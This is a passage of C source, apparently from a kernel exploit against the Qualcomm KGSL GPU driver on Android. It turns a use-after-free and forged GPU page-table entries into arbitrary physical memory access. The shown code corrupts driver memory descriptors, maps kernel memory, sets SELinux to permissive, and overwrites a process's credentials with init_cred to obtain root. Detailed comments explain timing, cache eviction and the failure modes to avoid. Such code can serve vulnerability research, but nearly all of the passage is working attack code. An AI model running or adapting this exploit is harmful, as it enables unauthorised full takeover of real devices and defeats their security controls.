                    len += cp_mem_write64(&ib[len],
                        DANGLING_BASE + ((uint64_t)pt_frame << 12), new_pte);
                    len += cp_wait_mem_writes(&ib[len]);
                    len += cp_nop(&ib[len], 0x0);
                    WD_START(20);
                    if (submit_ib(&pt_g, ib, len) == 0) break;
                    WD_STOP();
                    rebuild_ctx(&pt_g);
                }
                WD_STOP();
                usleep(500 * 1000);
                /* The forged PFN does not point at selinux state, so no byte value is expected here. */
                for (int chunk = 0; chunk < 4; chunk++) {
                    volatile uint8_t *probe = (volatile uint8_t *)(B + chunk*0x200000ULL);
                    uint8_t b = *probe;
                    L("[D] chunk %d first byte=0x%02x%s\n", chunk, b,
                      b == 0x92 ? " <- Image/enforcing page?" : "");
                }
            } else {
                L("[-] PT hunt: no page-table page found this round; retry next round (UAF window still open)\n");
            }
            log_fsync();
        }
        /* Control: re-run after the forged PTE submit, to separate a destroyed context
           from a PTE read fault. No control was taken before the forgery, so the two
           causes cannot be separated here. */
        gpu_control_check(&g, dst_id, dst_u, dst_g);
        log_fsync();
        flush_blocks_tlb();
        int scan_r = scan_spray();
        /* After the masquerade, map 320 MiB, touch it read-only and look for the
           slot-256 signature at +0x800 of every page. A hit is not guaranteed: the
           frame has to be faulted into the same pageblock and claimed by this
           process, and the test ((w & 0xFFFFF000) == 0x10080000) is wider than the
           single value 0x10080743, so the hit count is not a hit rate. */
        {
            size_t RS_SZ = 320UL * 1024 * 1024;
            unsigned char *rs = mmap(NULL, RS_SZ, PROT_READ | PROT_WRITE,
                MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
            if (rs != MAP_FAILED) {
                madvise(rs, RS_SZ, MADV_NOHUGEPAGE);
                int rs_hits = 0; long rs_pages = 0;
                for (size_t o = 0; o < RS_SZ; o += 4096) {
                    unsigned char c = *(volatile unsigned char *)(rs + o);
                    (void)c;
                    uint32_t w = *(volatile uint32_t *)(rs + o + 0x800);
                    rs_pages++;
                    if ((w & 0xFFFFF000u) == 0x10080000u || w == 0x10080743u) {
                        if (rs_hits < 8)
                            L("[+] RS hit page %ld @+0x800: 0x%08x\n", (long)(o >> 12), w);
                        rs_hits++;
                    }
                }
                L("[D] RS scan: %ld pages, %d hits\n", rs_pages, rs_hits);
                log_fsync();
                munmap(rs, RS_SZ);
            } else {
                L("[!] RS mmap FAILED errno=%d\n", errno);
            }
        }
        /* BMO landing scan: map 4096 64 KiB buffers (256 MiB total), invalidate their
           cache lines to force the frames back in, then look for the slot-256
           signature; unmap and free afterwards. The test has one arm fewer than the
           scan above (no w == 0x10080743 exception), so the two hit counts are not
           directly comparable. */
        {
            #define BMO_SZ 0x10000
            #define BMO_N  4096
            uint32_t *bmo_ids = malloc(BMO_N * 4);
            void **bmo_u = malloc(BMO_N * sizeof(void *));
            int bmo_ok = 0, bmo_hits = 0;
            if (bmo_ids && bmo_u) {
                for (int bi = 0; bi < BMO_N; bi++) {
                    bmo_ids[bi] = 0;
                    if (gpuobj_alloc(BMO_SZ, KGSL_MEMFLAGS_USE_CPU_MAP, &bmo_ids[bi]) != 0 || bmo_ids[bi] == 0) break;
                    bmo_u[bi] = mmap(NULL, BMO_SZ, PROT_READ | PROT_WRITE, MAP_SHARED,
                        kgsl_fd, ((off_t)bmo_ids[bi]) << 12);
                    if (bmo_u[bi] == MAP_FAILED) { bmo_u[bi] = NULL; break; }
                    bmo_ok++;
                    if ((bi & 0x3FF) == 0x3FF) log_fsync();
                }
                L("[D] BMO spray: %d objects (64KB)\n", bmo_ok);
                log_fsync();
                for (int bi = 0; bi < bmo_ok; bi++) {
                    gpuobj_sync(bmo_ids[bi], 0, BMO_SZ, KGSL_GPUMEM_CACHE_INV);
                    volatile uint32_t *base = (volatile uint32_t *)bmo_u[bi];
                    for (uint32_t wo = 0x800 / 4; wo < BMO_SZ / 4; wo += 0x1000 / 4) {
                        uint32_t w = base[wo];
                        if ((w & 0xFFFFF000u) == 0x10080000u) {
                            if (bmo_hits < 10)
                                L("[+] BMO hit id=%u off=0x%x: 0x%08x\n", bmo_ids[bi], wo * 4, w);
                            bmo_hits++;
                        }
                    }
                }
                L("[D] BMO scan done: %d hits\n", bmo_hits);
                log_fsync();
                for (int bi = 0; bi < bmo_ok; bi++) {
                    if (bmo_u[bi]) munmap(bmo_u[bi], BMO_SZ);
                    if (bmo_ids[bi]) gpuobj_free(bmo_ids[bi]);
                }
            } else {
                L("[!] BMO array malloc FAILED\n");
            }
            free(bmo_ids); free(bmo_u);
        }
        if (scan_r > 0 && n_pte_chunks > 0) {
            uint32_t got = 0;
            read_phys_proof(0x10080000ULL, 0xd503201f, &got);
            if (got == 0xd503201f)
                L("[+] arbitrary physical read confirmed (kernel text bytes read back through the GPU-masqueraded PTE)\n");
        } else {
            L("[-] Phase B miss: neither marker nor PTE chunk hit; preserve evidence\n");
        }
        /* Pagecache probe (oobprobe mode only): each page contributes one dword to
           dst_u+0x8000, but the scan reads 512 bytes there looking for "Linu". Only
           the first 4 bytes come from this page; the other 508 are whatever an
           earlier read left behind. found=-1 means the whole window was scanned
           without a hit. */
        {
            FILE *tf = fopen("/proc/version", "r");
            char tbuf[4096];
            if (tf) { size_t n = fread(tbuf, 1, sizeof(tbuf), tf); fclose(tf);
                (void)n; }
            log_fsync();

            struct gpu_ctx_t pc_g = {0};
            int pc_found = -1;
            if (setup_ib(&pc_g) == 0) {
                for (uint32_t pg = 0; pg < DANGLING_PAGES && pc_found < 0; pg += 4) {
                    gpu_read_one_m2m(&pc_g, DANGLING_BASE + ((uint64_t)pg << 12),
                        dst_id, dst_u, dst_g, 0x0, 0x8000, NULL, "PCSCAN");
                    volatile uint32_t *b32 = (volatile uint32_t *)((char *)dst_u + 0x8000);
                    for (int qi = 0; qi < 128; qi++) {
                        if (b32[qi] == 0x756e694cu) {
                            pc_found = pg;
                            L("[+] PCSCAN hit page %u\n", pg);
                            break;
                        }
                    }
                }
                /* What occupies those 508 bytes: an earlier read with per_batch=256
                   leaves 32 KiB from its 0x2000 offset; otherwise it is the driver's
                   initial MAP_SHARED contents, which this file cannot determine. The
                   earlier PTJ-SCAN fills only 0x8000..0x8003. */
                L("[D] PCSCAN done: found=%d\n", pc_found);
            }
        }

        L("[+] Phase B complete; pausing to preserve the device\n");
        log_fsync();
        uaf_pause();
    }

    /* P3 is intentionally disabled in the root candidate. A P2 miss is a
       negative/inconclusive result; a full-window write is not an acceptable
       automatic fallback because it can corrupt page-table pages. */
    if (probe_hits == 0) {
        L("[!] P2=0: stopping at P2 (dangerous full-window P3 disabled; preserve evidence, then cold reboot)\n");
        log_fsync();
        uaf_pause();
    } else {
        L("[*] P2 feedback hit %d; skipping the P3 rewrite\n", probe_hits);
    }

    L("=== 5. hit summary (P2 feedback + P3 rewrite = %d) ===\n", probe_hits);
    n_hits = probe_hits;
    g_rel_nh = n_hits; g_rel_nsprayed = n_sprayed;   /* snapshot for the RELEASE_DUMP command */

    /* Corruption and the diagnostic mmap.
       The full path corrupts everything (ops, phys, size, pages) with a readback
       retry; the second path only sends size. */
    if (n_hits > 0) {
        uint64_t OPS_ADDR = runtime_ops_addr;
        const uint64_t PHYS_ADDR = 0x90080000ULL;
        const uint64_t SIZE_VAL  = 0x40000000ULL;
        /* Churn in 4 MB blocks, the LLCC size, so that what it dirties stays off
           page-table pages; smaller blocks have written over them. Keep the churn after
           the trigger: a leftover PTE page from a map without unmap makes
           arm_lpae_init_pte fail with -EEXIST. */
        L("=== 6. P4 corruption (group A full + readback-retry) + P5 mmap ===\n");
        /* Dedicated corruption context: a fault in the earlier probe (EDEADLK)
           invalidates only that probe's context, and the corruption submits run on
           a clean one. */
        if (!corr_g_ready) { if (setup_ib(&corr_g) == 0) corr_g_ready = 1; }
        else { rebuild_ctx_empty(&corr_g); }
        if (corr_g_ready) L("[+] corr_g: ctx=%u ib=0x%llx\n", corr_g.ctx, (unsigned long long)corr_g.ib_gpuaddr);
        else L("[-] corr_g init FAILED; using g\n");
        wait_long_clean_band();   /* corruption and root run in a long clean band; the next window is >15 s */
        { struct timespec rs4; clock_gettime(CLOCK_MONOTONIC, &rs4); g_wd_round = (long long)rs4.tv_sec; }
        int n_corrupt = n_hits < 8 ? n_hits : 8;   /* Only the first 8 hits; the cap keeps this short. */
        /* Read one untouched candidate first and derive the runtime KASLR slide.
           If no validated kernel pointer is available, refuse all P4/root writes. */
        if (!runtime_kaslr_valid) {
            for (int hi = 0; hi < n_corrupt; hi++) {
                uint64_t ep0 = DANGLING_BASE + ((uint64_t)hit_pages[hi] << 12) +
                    (uint64_t)hit_slots[hi] * 512;
                if (gpu_read_memdesc(corr_g_ready ? &corr_g : &g, ep0, dst_id, dst_u,
                                     dst_g, "P4-KASLR-PREFLIGHT") == 0 &&
                    derive_runtime_kernel_addrs(diag_ops) == 0)
                    break;
            }
            if (!runtime_kaslr_valid) {
                L("[!] P4 stop: no validated runtime KASLR ops leak; refusing to write\n");
                log_fsync();
                goto p4_done;
            }
            OPS_ADDR = runtime_ops_addr;
        }
        int n_okA = 0;
        static int corruptA[8];
        uint32_t excluded_chunk = 0xffffffff;
        for (int hi = 0; hi < n_corrupt && n_okA < 8; hi++) {
            /* Pre-probe: mmap(4KB). EINVAL means ops is already broken (skip); ERANGE
               means ops dereferenced and only the size mismatched, so it is a
               real entry. */
            {
                errno = 0;
                void *pp0 = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, kgsl_fd, ((off_t)hit_ids[hi]) << 12);
                if (pp0 != MAP_FAILED) { munmap(pp0, 0x1000); L("[D] id=%u probe OK (?!)\n", hit_ids[hi]);
                    log_fsync(); }
                else if (errno != 34) { L("[D] id=%u probe errno=%d; ops already broken, skipping\n", hit_ids[hi], errno);
                    log_fsync(); continue; }
            }
            uint32_t chunk = (uint32_t)hit_pages[hi] >> 9;
            if (chunk == excluded_chunk) continue;
            uint64_t ep = DANGLING_BASE + ((uint64_t)hit_pages[hi] << 12) + (uint64_t)hit_slots[hi] * 512;
            /* ops takes runtime_ops_addr, which only exists once the KASLR leak gate
               above has been passed; STATIC_OPS_ADDR is a slide reference, not a
               value to send. phys, pages, flags and ops travel as count-3 32-bit
               packets, size as the only count-4 64-bit packet, and the IB is fresh
               every round. */
            uint32_t ib[64];
            int landed = 0;
            for (int attempt = 0; attempt < 2 && !landed; attempt++) {
                /* IB for ops only: an 8-byte count-4 packet is ineffective here and may
                   fault, so ops and size/phys are submitted separately, one of each. */
                uint32_t len = 0;
                len += cp_nop(&ib[len], 0x0);
                /* One IB carries phys and size (line 0x20-0x3F), ops low and high
                   (line 0x40-0x7F), and the flags marker 0x0000BA00 at +0x50, which
                   the CPU view can read back. */
                len += cp_mem_write(&ib[len], ep + 0x28, (uint32_t)PHYS_ADDR);
                len += cp_mem_write(&ib[len], ep + 0x2c, 0);
                len += cp_mem_write64(&ib[len], ep + 0x30, SIZE_VAL);   /* the only 64-bit count-4 packet, 16 B aligned */
                /* pages@entry+0x68 = memdesc.pages. The pointer computed from
                   PHYS_ADDR is 0x200000 too high in its low word (the high word
                   0xffffffc0 is correct), and the readback below does not cover pages,
                   so the error is silent. */
                len += cp_mem_write(&ib[len], ep + 0x68, 0x02202000u);
                len += cp_mem_write(&ib[len], ep + 0x6c, 0xffffffc0u);
                len += cp_mem_write(&ib[len], ep + 0x50, 0x0000BA00u);
                len += cp_mem_write(&ib[len], ep + 0x48, (uint32_t)OPS_ADDR);
                len += cp_mem_write(&ib[len], ep + 0x4c, (uint32_t)(OPS_ADDR >> 32));
                len += cp_wait_mem_writes(&ib[len]);
                len += cp_nop(&ib[len], 0x0);
                WD_START(20);
                int r = submit_ib(corr_g_ready ? &corr_g : &g, ib, len);
                WD_STOP();
                if (r != 0) {
                    L("[!] id=%u corruption submit fault errno=%d\n", hit_ids[hi], errno); log_fsync();
                    if (corr_g_ready && rebuild_ctx_empty(&corr_g) != 0) { L("[-] rebuild failed; P4 abandoned\n"); goto p4_done; }
                    else if (!corr_g_ready && rebuild_ctx(&g) != 0) { L("[-] rebuild failed; P4 abandoned\n"); goto p4_done; }
                    break;
                }
                if (wait_submit_retire((corr_g_ready ? corr_g.ctx : g.ctx), last_submit_ts) != 0) {
                    L("[!] id=%u corruption submit did not retire errno=%d\n", hit_ids[hi], errno);
                    log_fsync();
                    break;
                }
                /* Do not issue INFO/SET_INFO here: a stale CPU line can dirty and
                   write back over the GPU corruption. Evict with CPU storm, then
                   churn LLCC and require a positive GPU-side readback. */
                cpu_storm_v2();
                if (llcc_churn(&g) != 0) {
                    L("[!] churn failed; abandoning this candidate\n");
                    log_fsync();
                    break;
                }
                if (gpu_read_memdesc(&g, ep, dst_id, dst_u, dst_g, "DIAG2b(after churn)") != 0 ||
                    diag_ops != OPS_ADDR || diag_flags != 0xBA00ULL ||
                    diag_size != SIZE_VAL || diag_phys != PHYS_ADDR) {
                    L("[!] GPU readback mismatch: ops=0x%llx flags=0x%llx size=0x%llx phys=0x%llx; stopping P4\n",
                      (unsigned long long)diag_ops, (unsigned long long)diag_flags,
                      (unsigned long long)diag_size, (unsigned long long)diag_phys);
                    log_fsync();
                    break;
                }
                uint64_t sz = 0;
                int ops_ok = 0;
                {
                    errno = 0;
                    void *px = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, kgsl_fd, ((off_t)hit_ids[hi]) << 12);
                    if (px != MAP_FAILED) { munmap(px, 0x1000); ops_ok = 1; L("[D] id=%u ops probe OK (?!)\n", hit_ids[hi]);
                    log_fsync(); }
                    else if (errno == 34) { ops_ok = 1; L("[D] id=%u ops landed (ERANGE; ops valid, size mismatch)\n", hit_ids[hi]);
                    log_fsync(); }
                    else L("[D] id=%u ops probe errno=%d (ops not landed; retrying)\n", hit_ids[hi], errno);
                    log_fsync();
                }
                if (gpuobj_info_size(hit_ids[hi], &sz) == 0 && sz == SIZE_VAL && ops_ok) {
                    landed = 1;
                    L("[+] id=%u both lines landed: size=0x40000000 + ops valid (contiguous!)\n", hit_ids[hi]);
                    log_fsync(); }
                else if (gpuobj_info_size(hit_ids[hi], &sz) == 0 && sz == SIZE_VAL) {
                    landed = 1;
                    L("[+] id=%u LANDED size=0x40000000 ✓ ops_ok=%d\n", hit_ids[hi], ops_ok);
                    log_fsync();
                }
                else if (ops_ok) {
                    landed = 1;
                    L("[+] id=%u OPS-LANDED (ERANGE; ops valid! size=0x%llx uses the sentinel mlen)\n", hit_ids[hi], (unsigned long long)sz);
                    log_fsync();   /* SIZE_VAL (1 GiB, page aligned) is long enough to cover the selinux enforcing offset */
                }
                else {
                    L("[D] id=%u attempt %d not landed, size=0x%llx; retrying\n", hit_ids[hi], attempt, (unsigned long long)sz);
                    log_fsync();
                }
            }
            if (!landed) continue;
            corruptA[n_okA] = hi;
            n_okA++;
            
/* Only the first lander enters the escalation: the break caps it at one, a failure
   abandons the whole root attempt, and with nothing landed this section goes straight
   to the diagnostic mmap below. */
            break;
        }
p4_done:
        L("[+] P4 complete: group A (full+retry)=%d OK (hi:%d,%d,%d,%d,%d,%d,%d,%d)\n", n_okA,
            n_okA>0?corruptA[0]:-1, n_okA>1?corruptA[1]:-1, n_okA>2?corruptA[2]:-1,
            n_okA>3?corruptA[3]:-1, n_okA>4?corruptA[4]:-1, n_okA>5?corruptA[5]:-1,
            n_okA>6?corruptA[6]:-1, n_okA>7?corruptA[7]:-1);

/* Escalation: map 1 GiB and go for root on each landed entry. This block does not
   refresh g_wd_round, so once the watchdog's 30 s stage cap expires the parking
   thread leaves everything after it unguarded, though it still serves wdcmd. */
        for (int oi = 0; oi < n_okA; oi++) {
            int hi = corruptA[oi];
/* No INFO or probe read may touch this memdesc again: the first read dirties a stale
   cache line, and the writeback that follows erases what the GPU wrote. Verification
   is the one-page ops probe plus the 0x91005a4d read and nothing else.
   The last mile before the deref is a miss on line 0x00: churn LLCC to push the GPU
   write to DRAM, two CPU storms to evict it per core, then the size gate and the
   mmap+deref with nothing in between. */
            { for (int ct = 0; ct < 2 && llcc_churn(&g) != 0; ct++) { rebuild_ctx(&g); } }
            cpu_storm_v2(); cpu_storm_v2();
/* Probe only the weak criterion (one-page map success or ERANGE) to avoid an INFO
   read that can dirty a stale cache line. ERANGE is a candidate signal only; the
   0x91005a4d read below is the proof. */
            {
                errno = 0;
                void *og = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED,
                                kgsl_fd, ((off_t)hit_ids[hi]) << 12);
                int ops_candidate = 0;
                if (og != MAP_FAILED) { munmap(og, 0x1000); ops_candidate = 1; }
                else if (errno == ERANGE) ops_candidate = 1;
/* ops probe failed: give up without deref. There is at most one lander, so continue
   ends the escalation rather than trying another id. */
                if (!ops_candidate) {
                    L("[A] id=%u ops probe errno=%d; skipping\n", hit_ids[hi], errno);
                    log_fsync();
                    continue;
                }
            }
            errno = 0;
            uint64_t mlen2 = SIZE_VAL;
            void *p = mmap(NULL, mlen2, PROT_READ | PROT_WRITE, MAP_SHARED,
                           kgsl_fd, ((off_t)hit_ids[hi]) << 12);
            L("[A] id=%u mmap(1GB) -> %p errno=%d(%s)\n", hit_ids[hi], p, errno, strerror(errno));
            log_fsync();
/* The deref guard rides on the global jmp_armed/jmpbuf pair, shared by every sigsetjmp in this file. */
            jmp_armed = 1;
            if (sigsetjmp(jmpbuf, 1) != 0) {
                jmp_armed = 0;
                L("[!] id=%u deref fault\n", hit_ids[hi]);
                log_fsync();
                munmap(p, mlen2);
                continue;
            }
            jmp_armed = 0;
            uint32_t magic = *(volatile uint32_t *)p;
            L("[+] id=%u map=%p map[0]=0x%08x%s\n", hit_ids[hi], p, magic,
              (magic == 0x91005a4d) ? " <- kernel magic!" : "");
            log_fsync();
            if (magic == 0x91005a4d) {
                L("[+] ====== kernel physical mapping succeeded!! ======\n");
                    log_fsync();
#if !V7_ENABLE_PRIV_WRITE
                L("[!] privilege-write stage disabled at compile time; aborting before SELinux/cred writes\n");
                log_fsync();
                munmap(p, mlen2);
                continue;
#endif
                #define SEL_PHYS       0x92cac001ULL
                #define PHYS_BASE      0x90080000ULL
                #define TASK_CRED_OFF  0x808
                const uint64_t INIT_CRED = runtime_init_cred_addr;
                volatile uint8_t *sel = (volatile uint8_t *)((char *)p + (SEL_PHYS - PHYS_BASE));
                uint8_t enforcing_before = *sel;
                L("[*] enforcing readback=0x%02x (expected 0x01)\n", enforcing_before);
                    log_fsync();
/* Refusing gate: enforcing must read back 1 before the core is touched, and read back 0 after the write before the credential stage. */
                if (enforcing_before != 1) {
                    L("[!] enforcing precondition failed; refusing SELinux/cred writes\n");
                    log_fsync();
                    munmap(p, mlen2);
                    continue;
                }
                *sel = 0;
                uint8_t enforcing_after = *sel;
                if (enforcing_after != 0) {
                    L("[!] enforcing write did not read back as 0; refusing credential stage\n");
                    log_fsync();
                    munmap(p, mlen2);
                    continue;
                }
                L("[+] enforcing=0 ✓ -> SELinux permissive\n");
                    log_fsync();
                {
                    pid_t child_pids[4];
                    for (int ci = 0; ci < 4; ci++) {
                        void *st = mmap(NULL, 16384, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
                        if (st == MAP_FAILED) { child_pids[ci] = -1; continue; }
                        pid_t cpid = clone(p5_child_main, (char *)st + 8192, CLONE_VM | SIGCHLD, NULL);
                        if (cpid < 0) { munmap(st, 16384); child_pids[ci] = -1; continue; }
                        child_pids[ci] = cpid;
                    }
                    L("[*] 4 children (comm=Z33107X); scanning the kernel physical window for task_struct...\n");
                    log_fsync();
                    {
                        int found = 0;
                        unsigned char *win = (unsigned char *)p;
                        size_t win_sz = mlen2;
/* cred sits at task_struct+cred_off and comm at cred_off+0x10; only that delta is
   needed here. The scan stride must stay at 8 or below: a stride of 64 starting at 0
   skips every cred slot modulo 64. */
                        for (size_t off = 0; off + 0x820 <= win_sz; off += 8) {
                            if (win[off + 0x10] == 'Z' && win[off + 0x10 + 1] == '3' &&
                                win[off + 0x10 + 2] == '3' && win[off + 0x10 + 3] == '1' &&
                                win[off + 0x10 + 4] == '0' && win[off + 0x10 + 5] == '7' &&
                                win[off + 0x10 + 6] == 'X') {
                                /* comm is a strong marker, but require cred to look like a
                                   kernel VA before changing it. */
                                uint64_t old_cred = *(volatile uint64_t *)(win + off);
                                if ((old_cred >> 32) != 0xffffffc0U) continue;
                                L("[+] found task_struct comm @ phys 0x%llx\n",
                                    (unsigned long long)(PHYS_BASE + off));
                    log_fsync();
                                *(volatile uint64_t *)(win + off) = INIT_CRED;
                                L("[+] cred written with init_cred (+0x808)\n");
                    log_fsync();
                                found = 1;
                                break;
                            }
                        }
/* Abort if no verified task_struct turns up; deliberately no credential fallback, which would write an unvalidated pointer. */
                        if (!found) {
                            L("[!] scan found no validated task_struct; refusing any credential fallback\n");
                            log_fsync();
                            for (int ci = 0; ci < 4; ci++) {
                                if (child_pids[ci] > 0) {
                                    kill(child_pids[ci], SIGKILL);
                                    waitpid(child_pids[ci], NULL, 0);
                                }
                            }
                            munmap(p, mlen2);
                            continue;
                        }
                    log_fsync();
                    }
                    L("[+] cred write done; waiting for the children to poll...\n");
                    log_fsync();
/* No verdict is reached here: it belongs to the child, which polls for uid 0, writes
   the proof and enters the root fifo server. root_fifo_server does not return, so
   once root is reached the waitpid below blocks forever and the "children finished"
   line is printed only on the failure path. */
                    for (int ci = 0; ci < 4; ci++) {
                        if (child_pids[ci] > 0) waitpid(child_pids[ci], NULL, 0);
                    }
                    L("[*] children finished (if ROOTED, sh has been exec'd)\n");
                    log_fsync();
                }
                break;
            }
            munmap(p, mlen2);
        }
/* Diagnostic mmap for the size-only candidates, ids 8-15, which the full corruption
   path never touched: a 4 KiB map to read errno, no deref. Nothing prints when
   n_hits <= 8, and nothing reaches here once root is reached, because main is parked
   in the waitpid above. */
        for (int hi = 8; hi < 16 && hi < n_hits; hi++) {
            errno = 0;
            void *bp = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, kgsl_fd, ((off_t)hit_ids[hi]) << 12);
            L("[B] id=%u mmap(4KB) -> %p errno=%d(%s)\n", hit_ids[hi], bp, errno, strerror(errno));
                    log_fsync();
            if (bp != MAP_FAILED) munmap(bp, 0x1000);
        }
/* First sprayed entry as the 4 KiB control: nothing prints when n_sprayed == 0, and as above it is unreachable once root is reached. */
        if (n_sprayed > 0) {
            errno = 0;
            void *cp = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, kgsl_fd, ((off_t)spray_ids[0]) << 12);
            L("[C] id=%u mmap(4KB) -> %p errno=%d(%s)\n", spray_ids[0], cp, errno, strerror(errno));
                    log_fsync();
            if (cp != MAP_FAILED) munmap(cp, 0x1000);
        }
    } else {
        L("[-] 0 hits\n");
                    log_fsync();
    }
    L("done\n");   /* failure path only: once root is reached main is parked in the waitpid above and never prints this */
/* Do not exit on our own after the UAF: the kgsl teardown crashes. The only exit is a
   wdcmd RELEASE_MAIN, and the server must first heal and free everything. None of
   this is reached once root is reached; main is parked in the waitpid above. */
    uaf_pause();
}
}   /* main never returns: on failure it parks in uaf_pause, on success it blocks in the waitpid above because the child does not exit */
